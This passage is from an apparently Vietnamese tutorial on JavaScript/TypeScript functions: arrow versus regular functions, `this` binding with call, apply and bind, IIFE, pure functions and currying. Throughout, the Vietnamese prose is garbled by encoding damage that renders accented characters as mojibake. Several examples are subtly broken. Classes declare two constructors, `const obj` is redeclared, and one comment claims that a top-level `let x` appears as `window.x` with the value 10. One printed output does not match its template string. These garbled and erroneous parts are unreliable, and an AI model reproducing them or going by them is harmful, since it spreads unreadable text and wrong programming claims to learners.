// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âœ… Regular function - HOISTED (cÃ³ thá»ƒ gá»i trÆ°á»›c khi khai bÃ¡o)
console.log(regularHoisted()); // âœ… "Hello" - works!

function regularHoisted(): string {
  return 'Hello';
}

// âŒ Arrow function - KHÃ”NG hoisted
// console.log(arrowHoisted()); 
// âŒ ReferenceError: Cannot access 'arrowHoisted' before initialization

const arrowHoisted = (): string => 'Hello';
```

#### **1.6. Methods & Prototype**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PROTOTYPE - Regular cÃ³ prototype, Arrow khÃ´ng
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function RegularFn() {}
console.log(RegularFn.prototype); // âœ… { constructor: f }

const ArrowFn = () => {};
console.log(ArrowFn.prototype); // âŒ undefined

// Use case: ThÃªm methods vÃ o prototype
function Person(name: string) {
  this.name = name;
}

Person.prototype.greet = function() {
  return `Hello, I'm ${this.name}`;
  // âœ… Pháº£i dÃ¹ng regular function Ä‘á»ƒ cÃ³ this
};

const person = new Person('John');
console.log(person.greet()); // "Hello, I'm John"
```

---

### **2. this Binding - call, apply, bind**

#### **2.1. Understanding `this` Context**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// THIS CONTEXT - 4 quy táº¯c
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// 1ï¸âƒ£ Default binding (strict mode: undefined, non-strict: window)
function showThis() {
  console.log(this);
}
showThis(); // window (non-strict) hoáº·c undefined (strict)

// 2ï¸âƒ£ Implicit binding (object gá»i method)
const obj = {
  name: 'John',
  greet() {
    console.log(this.name); // "John" - this = obj
  }
};
obj.greet();

// 3ï¸âƒ£ Explicit binding (call, apply, bind)
function greet() {
  console.log(this.name);
}
const user = { name: 'Alice' };
greet.call(user); // "Alice" - this = user

// 4ï¸âƒ£ new binding (constructor)
function Person(name: string) {
  this.name = name;
}
const p = new Person('Bob'); // this = instance má»›i
```

#### **2.2. call() - Gá»i ngay vá»›i arguments riÃªng láº»**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CALL - fn.call(thisArg, arg1, arg2, arg3, ...)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person1 = { name: 'John' };
const person2 = { name: 'Alice' };

// Gá»i introduce vá»›i this = person1
console.log(introduce.call(person1, 25, 'HCM')); 
// "I'm John, 25 years old, from HCM"

// Gá»i introduce vá»›i this = person2
console.log(introduce.call(person2, 30, 'HN')); 
// "I'm Alice, 30 years old, from HN"

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case: Function borrowing
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const car = {
  brand: 'Toyota',
  model: 'Camry',
  getInfo() {
    return `${this.brand} ${this.model}`;
  }
};

const bike = { brand: 'Honda', model: 'CBR' };

// "MÆ°á»£n" method getInfo cá»§a car cho bike
console.log(car.getInfo.call(bike)); 
// "Honda CBR" âœ… - this = bike

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case: Array-like to Array
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function argsToArray() {
  // arguments lÃ  array-like, khÃ´ng pháº£i array
  // MÆ°á»£n method slice cá»§a Array
  const arr = Array.prototype.slice.call(arguments);
  console.log(arr); // [1, 2, 3] - thÃ nh array tháº­t âœ…
}

argsToArray(1, 2, 3);
```

#### **2.3. apply() - Gá»i ngay vá»›i array of arguments**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// APPLY - fn.apply(thisArg, [arg1, arg2, arg3, ...])
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person = { name: 'John' };

// apply - arguments lÃ  ARRAY
const args = [25, 'HCM'];
console.log(introduce.apply(person, args)); 
// "I'm John, 25 years old, from HCM"

// So sÃ¡nh vá»›i call
console.log(introduce.call(person, 25, 'HCM')); // Giá»‘ng káº¿t quáº£

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case: Math.max vá»›i array
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const numbers = [5, 6, 2, 3, 7, 1];

// âŒ Math.max nháº­n arguments riÃªng láº», khÃ´ng nháº­n array
// console.log(Math.max(numbers)); // NaN

// âœ… DÃ¹ng apply Ä‘á»ƒ "spread" array thÃ nh arguments
console.log(Math.max.apply(null, numbers)); // 7

// Modern: DÃ¹ng spread operator (ES6+)
console.log(Math.max(...numbers)); // 7 - dá»… Ä‘á»c hÆ¡n âœ…

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// call vs apply - Khi nÃ o dÃ¹ng cÃ¡i nÃ o?
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// call: Khi biáº¿t CHÃNH XÃC sá»‘ lÆ°á»£ng arguments
fn.call(obj, arg1, arg2, arg3);

// apply: Khi arguments lÃ  ARRAY hoáº·c Äá»˜NG
fn.apply(obj, argsArray);
fn.apply(obj, [...dynamicArgs]);
```

#### **2.4. bind() - Táº¡o function má»›i vá»›i this cá»‘ Ä‘á»‹nh**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BIND - fn.bind(thisArg, arg1, arg2, ...)
// Tráº£ vá» FUNCTION Má»šI, KHÃ”NG gá»i ngay!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person = { name: 'John' };

// bind táº¡o function Má»šI vá»›i this = person
const boundIntroduce = introduce.bind(person);

// Gá»i function má»›i
console.log(boundIntroduce(25, 'HCM')); 
// "I'm John, 25 years old, from HCM"

// this luÃ´n luÃ´n lÃ  person, khÃ´ng thay Ä‘á»•i Ä‘Æ°á»£c!
const anotherPerson = { name: 'Alice' };
console.log(boundIntroduce.call(anotherPerson, 30, 'HN')); 
// "I'm John, 30, from HN" 
// âš ï¸ Váº«n lÃ  "John", khÃ´ng pháº£i "Alice"!
// this Ä‘Ã£ bá»‹ "khÃ³a cá»©ng" = person

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case 1: Event handlers
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Button {
  constructor(public label: string) {}

  // âŒ SAI: this sáº½ máº¥t khi lÃ m event handler
  handleClickWrong() {
    console.log(this.label); // undefined khi click
  }

  // âœ… ÄÃšNG: Bind this trong constructor
  constructor(public label: string) {
    this.handleClick = this.handleClick.bind(this);
  }

  handleClick() {
    console.log(this.label); // âœ… Works!
  }
}

const btn = new Button('Submit');
document.addEventListener('click', btn.handleClick); 
// âœ… this = btn instance

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case 2: Partial application (Currying)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function multiply(a: number, b: number, c: number): number {
  return a * b * c;
}

// "KhÃ³a" argument Ä‘áº§u tiÃªn = 2
const double = multiply.bind(null, 2); 
// double = (b, c) => 2 * b * c

console.log(double(3, 4)); // 2 * 3 * 4 = 24
console.log(double(5, 6)); // 2 * 5 * 6 = 60

// "KhÃ³a" 2 arguments Ä‘áº§u
const multiplyBy2And3 = multiply.bind(null, 2, 3);
// multiplyBy2And3 = (c) => 2 * 3 * c

console.log(multiplyBy2And3(4)); // 2 * 3 * 4 = 24

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Use case 3: setTimeout/setInterval
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Timer {
  constructor(public count: number = 0) {}

  // âŒ SAI: this máº¥t trong setTimeout
  startWrong() {
    setTimeout(function() {
      this.count++; // âŒ this = window/undefined
      console.log(this.count);
    }, 1000);
  }

  // âœ… ÄÃšNG: Bind this
  startBind() {
    setTimeout(function() {
      this.count++; // âœ… this = Timer instance
      console.log(this.count);
    }.bind(this), 1000);
  }

  // âœ… ÄÃšNG: Arrow function (khuyáº¿n nghá»‹)
  startArrow() {
    setTimeout(() => {
      this.count++; // âœ… Arrow láº¥y this tá»« outer scope
      console.log(this.count);
    }, 1000);
  }
}
```

---

### **3. So SÃ¡nh Tá»•ng Quan**

#### **3.1. Arrow vs Regular Functions**

| Feature | Arrow Function | Regular Function |
|---------|---------------|------------------|
| **Syntax** | `() => {}` | `function() {}` |
| **this binding** | Lexical (tá»« outer scope) | Dynamic (runtime) |
| **arguments** | âŒ KhÃ´ng cÃ³ | âœ… CÃ³ |
| **Constructor** | âŒ KhÃ´ng dÃ¹ng `new` | âœ… DÃ¹ng Ä‘Æ°á»£c `new` |
| **Hoisting** | âŒ KhÃ´ng hoisted | âœ… Hoisted |
| **prototype** | âŒ undefined | âœ… CÃ³ prototype |
| **Method** | âŒ KhÃ´ng nÃªn dÃ¹ng | âœ… NÃªn dÃ¹ng |
| **Callback** | âœ… NÃªn dÃ¹ng | âŒ Máº¥t this |

#### **3.2. call vs apply vs bind**

| Method | Syntax | Invoke ngay? | Use case |
|--------|--------|--------------|----------|
| **call** | `fn.call(thisArg, arg1, arg2)` | âœ… CÃ³ | Biáº¿t chÃ­nh xÃ¡c sá»‘ arguments |
| **apply** | `fn.apply(thisArg, [args])` | âœ… CÃ³ | Arguments lÃ  array |
| **bind** | `fn.bind(thisArg, arg1)` | âŒ KhÃ´ng | Event handlers, partial application |

---

### **4. Best Practices & Common Mistakes**

#### **4.1. Best Practices**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// âœ… BEST PRACTICES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// 1ï¸âƒ£ Arrow functions cho CALLBACKS
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map(n => n * 2); // âœ… Clean

// 2ï¸âƒ£ Regular functions cho OBJECT METHODS
const user = {
  name: 'John',
  greet() { // âœ… Shorthand method syntax
    console.log(`Hello, ${this.name}`);
  }
};

// 3ï¸âƒ£ Arrow functions cho NESTED FUNCTIONS (trÃ¡nh máº¥t this)
class Component {
  data = [];
  
  fetchData() {
    fetch('/api/data')
      .then(response => response.json())
      .then(data => {
        this.data = data; // âœ… Arrow giá»¯ this = Component
      });
  }
}

// 4ï¸âƒ£ bind() trong CONSTRUCTOR cho event handlers
class Button {
  constructor() {
    this.handleClick = this.handleClick.bind(this); // âœ…
  }
  
  handleClick() {
    console.log(this); // âœ… this = Button instance
  }
}

// 5ï¸âƒ£ Hoáº·c dÃ¹ng CLASS FIELDS vá»›i arrow (modern)
class ButtonModern {
  handleClick = () => {
    console.log(this); // âœ… Arrow giá»¯ this
  }
}
```

#### **4.2. Common Mistakes**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// âŒ COMMON MISTAKES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âŒ 1. Arrow function cho object methods
const obj = {
  name: 'John',
  greet: () => {
    console.log(this.name); // âŒ undefined (this = window)
  }
};

// âœ… Fix: DÃ¹ng regular function hoáº·c method shorthand
const obj = {
  name: 'John',
  greet() {
    console.log(this.name); // âœ… "John"
  }
};

// âŒ 2. QuÃªn bind this cho event handlers
class Component {
  name = 'MyComponent';
  
  handleClick() {
    console.log(this.name); // âŒ undefined
  }
  
  componentDidMount() {
    button.addEventListener('click', this.handleClick);
    // âŒ this máº¥t khi click!
  }
}

// âœ… Fix: Bind hoáº·c arrow function
class Component {
  name = 'MyComponent';
  
  // Option 1: Bind trong constructor
  constructor() {
    this.handleClick = this.handleClick.bind(this);
  }
  
  handleClick() {
    console.log(this.name); // âœ… "MyComponent"
  }
  
  // Option 2: Arrow function (khuyáº¿n nghá»‹)
  handleClickArrow = () => {
    console.log(this.name); // âœ… "MyComponent"
  }
}

// âŒ 3. DÃ¹ng arguments trong arrow function
const sum = (...numbers) => {
  // console.log(arguments); // âŒ ReferenceError
  console.log(numbers); // âœ… DÃ¹ng rest parameters
  return numbers.reduce((a, b) => a + b, 0);
};

// âŒ 4. Bind nhiá»u láº§n (khÃ´ng cáº§n thiáº¿t)
const fn = function() { console.log(this.name); };
const obj = { name: 'John' };

const bound1 = fn.bind(obj);
const bound2 = bound1.bind({ name: 'Alice' });
bound2(); // "John" - âŒ Bind chá»‰ cÃ³ hiá»‡u lá»±c láº§n Ä‘áº§u!

// âŒ 5. Nháº§m láº«n call/apply/bind
fn.call(obj);   // âœ… Gá»i NGAY
fn.apply(obj);  // âœ… Gá»i NGAY
fn.bind(obj);   // âŒ KHÃ”NG gá»i, tráº£ vá» function má»›i!
fn.bind(obj)(); // âœ… Pháº£i gá»i thÃªm ()
```

---

### **5. Real-World Examples**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REACT COMPONENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TodoList extends React.Component {
  state = {
    todos: [],
    newTodo: ''
  };

  // âœ… Arrow function - auto bind this
  handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    this.setState({ newTodo: e.target.value });
  }

  // âœ… Arrow function - auto bind this
  addTodo = () => {
    this.setState(prev => ({
      todos: [...prev.todos, prev.newTodo],
      newTodo: ''
    }));
  }

  // âœ… Regular function OK cho lifecycle methods
  componentDidMount() {
    // Fetch data...
    fetch('/api/todos')
      .then(res => res.json())
      .then(todos => {
        this.setState({ todos }); // âœ… Arrow trong callback
      });
  }

  render() {
    return (
      <div>
        <input 
          value={this.state.newTodo}
          onChange={this.handleInputChange} // âœ… No need .bind(this)
        />
        <button onClick={this.addTodo}>Add</button>
      </div>
    );
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEBOUNCE FUNCTION vá»›i bind
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function debounce<T extends (...args: any[]) => any>(
  fn: T,
  delay: number
): (...args: Parameters<T>) => void {
  let timeoutId: NodeJS.Timeout;

  return function(this: any, ...args: Parameters<T>) {
    clearTimeout(timeoutId);
    
    timeoutId = setTimeout(() => {
      fn.apply(this, args); // âœ… Giá»¯ this context
    }, delay);
  };
}

class SearchBox {
  searchTerm = '';

  search(query: string) {
    console.log(`Searching for: ${query}`);
    console.log(`Current term: ${this.searchTerm}`);
  }

  // Debounce vá»›i bind
  debouncedSearch = debounce(this.search, 300).bind(this);
}
```

---

### **ğŸ’¡ Key Takeaways**

**Arrow Functions:**
- âœ… DÃ¹ng cho callbacks, array methods (map, filter, forEach...)
- âœ… DÃ¹ng khi muá»‘n giá»¯ this tá»« outer scope
- âŒ KhÃ´ng dÃ¹ng cho object methods
- âŒ KhÃ´ng dÃ¹ng lÃ m constructors

**Regular Functions:**
- âœ… DÃ¹ng cho object methods
- âœ… DÃ¹ng khi cáº§n arguments object
- âœ… DÃ¹ng lÃ m constructors
- âŒ Dá»… máº¥t this trong callbacks (pháº£i bind)

**call/apply/bind:**
- ğŸ“ **call**: Gá»i ngay vá»›i args riÃªng láº» â†’ function borrowing
- ğŸ“‹ **apply**: Gá»i ngay vá»›i array args â†’ Math.max(array)
- ğŸ”— **bind**: Táº¡o function má»›i â†’ event handlers, partial application

**Remember:**
> "Arrow function = lexical this (tá»« outer scope). Regular function = dynamic this (runtime). DÃ¹ng call/apply khi cáº§n gá»i ngay, bind khi cáº§n function má»›i vá»›i this cá»‘ Ä‘á»‹nh!" ğŸ¯

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ¯ Q16: IIFE (Immediately Invoked Function Expression) & Functional Programming</span></summary>


**âš¡ Quick Summary:**
> IIFE = `(function(){})()` - cháº¡y ngay, táº¡o scope riÃªng. FP = pure functions, immutability

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **IIFE**: Execute ngay, trÃ¡nh pollute global scope
- ğŸ”¥ **Pure Function**: Same input â†’ same output, no side effects
- ğŸ“¦ **Currying**: `f(a,b)` â†’ `f(a)(b)` - partial application

**â“ CÃ¢u Há»i:**

Giáº£i thÃ­ch IIFE, Pure Functions, Currying vÃ  Higher-Order Functions trong JavaScript. Bao gá»“m cÃ¡ch hoáº¡t Ä‘á»™ng, Æ°u nhÆ°á»£c Ä‘iá»ƒm vÃ  á»©ng dá»¥ng thá»±c táº¿.


---

**ğŸ“š Pháº§n 1: IIFE (Immediately Invoked Function Expression)**

**ğŸ’¡ IIFE LÃ  GÃ¬?**

IIFE (Ä‘á»c lÃ  "iffy") lÃ  má»™t function Ä‘Æ°á»£c **gá»i ngay láº­p tá»©c** sau khi Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a. NÃ³ táº¡o ra má»™t **scope riÃªng biá»‡t**, giÃºp trÃ¡nh Ã´ nhiá»…m global namespace.

**ğŸ”¥ CÃº PhÃ¡p:**

```typescript
// CÃ¡ch 1: Bá»c function trong ()
(function () {
  // Code á»Ÿ Ä‘Ã¢y cháº¡y ngay láº­p tá»©c
})();

// CÃ¡ch 2: Bá»c toÃ n bá»™ trong ()
(function () {
  // Code á»Ÿ Ä‘Ã¢y cháº¡y ngay láº­p tá»©c
})();
```

**ğŸ’¡ Táº¡i Sao Cáº§n IIFE?**

```typescript
// âŒ KHÃ”NG dÃ¹ng IIFE - Biáº¿n x, y "rÃ² rá»‰" ra global scope
let x = 10;
let y = 20;
console.log(window.x); // 10 - Ã” nhiá»…m global scope! âŒ

// âœ… DÃ¹ng IIFE - Biáº¿n x, y KHÃ”NG rÃ² rá»‰
(function () {
  let x = 10; // Private variable - chá»‰ tá»“n táº¡i trong scope nÃ y
  let y = 20;
  console.log(x + y); // 30
})();

console.log(typeof x); // "undefined" - x KHÃ”NG tá»“n táº¡i bÃªn ngoÃ i âœ…
```

**ğŸ¯ Use Cases cá»§a IIFE:**

```typescript
// 1ï¸âƒ£ Module Pattern - Táº¡o private state
const calculator = (function () {
  let result = 0; // âš ï¸ Private variable - khÃ´ng thá»ƒ access tá»« bÃªn ngoÃ i

  return {
    add(x: number): number {
      result += x; // Chá»‰ thay Ä‘á»•i Ä‘Æ°á»£c qua method nÃ y
      return result;
    },
    subtract(x: number): number {
      result -= x;
      return result;
    },
    getResult(): number {
      return result; // Chá»‰ Ä‘á»c Ä‘Æ°á»£c qua method nÃ y
    },
  };
})();

calculator.add(10); // 10
calculator.subtract(3); // 7
console.log(calculator.result); // undefined - âŒ KhÃ´ng access Ä‘Æ°á»£c private variable
console.log(calculator.getResult()); // 7 - âœ… Pháº£i dÃ¹ng method

// 2ï¸âƒ£ IIFE vá»›i Parameters - Truyá»n arguments vÃ o
(function (name: string, age: number) {
  console.log(`Xin chÃ o ${name}, ${age} tuá»•i`);
})('John', 25); // "Xin chÃ o John, 25 tuá»•i"

// 3ï¸âƒ£ IIFE vá»›i Return Value - Tráº£ vá» káº¿t quáº£
const sum = (function (a: number, b: number): number {
  return a + b; // TÃ­nh toÃ¡n vÃ  tráº£ vá» ngay láº­p tá»©c
})(5, 10);
console.log(sum); // 15

// 4ï¸âƒ£ IIFE vá»›i Async/Await - Xá»­ lÃ½ báº¥t Ä‘á»“ng bá»™
(async function () {
  try {
    const response = await fetch('/api/users');
    const users = await response.json();
    console.log(users);
  } catch (error) {
    console.error('Lá»—i:', error);
  }
})();
```

**âœ… Æ¯u Äiá»ƒm cá»§a IIFE:**

- âœ… **Data Privacy**: Táº¡o private variables/functions
- âœ… **TrÃ¡nh Global Pollution**: Variables khÃ´ng rÃ² rá»‰ ra global scope
- âœ… **Module Pattern**: Táº¡o modules vá»›i public/private members
- âœ… **One-time Execution**: Code cháº¡y 1 láº§n duy nháº¥t

**âŒ NhÆ°á»£c Äiá»ƒm cá»§a IIFE:**

- âŒ **KhÃ³ Ä‘á»c**: Syntax phá»©c táº¡p cho beginners
- âŒ **KhÃ³ debug**: Stack trace phá»©c táº¡p hÆ¡n
- âŒ **ES6 Modules tá»‘t hÆ¡n**: Hiá»‡n nay dÃ¹ng `import/export` thay tháº¿

---


**ğŸ“š Pháº§n 2: Functional Programming - Pure Functions, Currying & HOF**

**ğŸ’¡ Functional Programming LÃ  GÃ¬?**

Functional Programming (FP) lÃ  paradigm láº­p trÃ¬nh táº­p trung vÃ o:

- **Pure Functions**: HÃ m khÃ´ng cÃ³ side effects
- **Immutability**: KhÃ´ng thay Ä‘á»•i dá»¯ liá»‡u gá»‘c
- **Function Composition**: Káº¿t há»£p cÃ¡c hÃ m nhá» thÃ nh hÃ m lá»›n

---

**ğŸ”¥ 1. Pure Functions (HÃ m Thuáº§n TÃºy)**

**ğŸ’¡ Pure Function LÃ  GÃ¬?**

Pure function lÃ  hÃ m thá»a mÃ£n 2 Ä‘iá»u kiá»‡n:

1. **Same Input â†’ Same Output**: CÃ¹ng input luÃ´n cho cÃ¹ng output
2. **No Side Effects**: KhÃ´ng thay Ä‘á»•i state bÃªn ngoÃ i (global variables, database, file, etc.)

```typescript
// âœ… Pure Function - HoÃ n háº£o!
function add(a: number, b: number): number {
  return a + b; // âœ… Chá»‰ tÃ­nh toÃ¡n, khÃ´ng side effects
}

console.log(add(2, 3)); // 5 - Gá»i 1000 láº§n váº«n tráº£ vá» 5
console.log(add(2, 3)); // 5 - Predictable (dá»± Ä‘oÃ¡n Ä‘Æ°á»£c)

// âŒ Impure Function - CÃ³ side effects
let counter = 0; // âš ï¸ External state

function increment(): number {
  counter++; // âŒ Side effect - thay Ä‘á»•i biáº¿n bÃªn ngoÃ i
  return counter;
}

console.log(increment()); // 1
console.log(increment()); // 2 - âŒ CÃ¹ng input (khÃ´ng cÃ³), khÃ¡c output!

// âœ… Chuyá»ƒn thÃ nh Pure Function
function increment(counter: number): number {
  return counter + 1; // âœ… KhÃ´ng thay Ä‘á»•i state, return giÃ¡ trá»‹ má»›i
}

let myCounter = 0;
myCounter = increment(myCounter); // 1 - RÃµ rÃ ng, dá»… test
myCounter = increment(myCounter); // 2
```

**ğŸ¯ Æ¯u Äiá»ƒm cá»§a Pure Functions:**

- âœ… **Testable**: Dá»… test (chá»‰ cáº§n check input/output)
- âœ… **Predictable**: Dá»± Ä‘oÃ¡n Ä‘Æ°á»£c káº¿t quáº£
- âœ… **Cacheable**: CÃ³ thá»ƒ cache káº¿t quáº£ (memoization)
- âœ… **Parallel Safe**: An toÃ n khi cháº¡y song song

---

**ğŸ”¥ 2. Currying (Chuyá»ƒn Äá»•i HÃ m)**

**ğŸ’¡ Currying LÃ  GÃ¬?**

Currying lÃ  ká»¹ thuáº­t **chuyá»ƒn Ä‘á»•i** má»™t function nháº­n **nhiá»u tham sá»‘** thÃ nh **chuá»—i cÃ¡c functions**, má»—i function nháº­n **1 tham sá»‘**.

```typescript
// âŒ Function thÃ´ng thÆ°á»ng - Nháº­n táº¥t cáº£ tham sá»‘ cÃ¹ng lÃºc
function add(a: number, b: number): number {
  return a + b;
}
console.log(add(2, 3)); // 5 - Pháº£i truyá»n cáº£ 2 sá»‘

// âœ… Currying - Nháº­n tá»«ng tham sá»‘ má»™t
const add = (a: number) => (b: number) => a + b;
//            â†‘ nháº­n a    â†‘ tráº£ vá» function nháº­n b

const add2 = add(2); // add2 lÃ  function: (b) => 2 + b
console.log(add2(3)); // 5 - Giá»‘ng káº¿t quáº£ trÃªn
console.log(add2(10)); // 12 - CÃ³ thá»ƒ tÃ¡i sá»­ dá»¥ng add2
console.log(add(2)(3)); // 5 - Hoáº·c gá»i luÃ´n
```

**ğŸ¯ Use Cases cá»§a Currying:**

```typescript
// 1ï¸âƒ£ Táº¡o specialized functions (hÃ m chuyÃªn dá»¥ng)
const multiply = (a: number) => (b: number) => a * b;

const double = multiply(2); // HÃ m nhÃ¢n Ä‘Ã´i
const triple = multiply(3); // HÃ m nhÃ¢n ba

console.log(double(5)); // 10 - double tÃ¡i sá»­ dá»¥ng Ä‘Æ°á»£c
console.log(triple(5)); // 15

// 2ï¸âƒ£ Partial Application - Ãp dá»¥ng má»™t pháº§n tham sá»‘
